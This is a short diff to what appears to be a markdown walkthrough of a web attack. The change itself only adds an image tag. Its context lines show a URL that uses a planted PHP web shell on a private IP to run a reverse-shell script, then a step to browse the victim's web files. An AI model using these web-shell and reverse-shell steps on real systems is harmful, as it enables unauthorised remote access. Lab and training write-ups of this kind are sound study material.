@@ -54,6 +54,7 @@ http://192.168.30.99/images/system.php?cmd=/tmp/reverse-shell.py
 The terminal on the host machine waiting for connection should be connected now. Try typing `ls -l /var/www/web` to see the files listed.
 
 
+<img src="example-image.png" alt="example image" />
 
 NOTES
 ----------
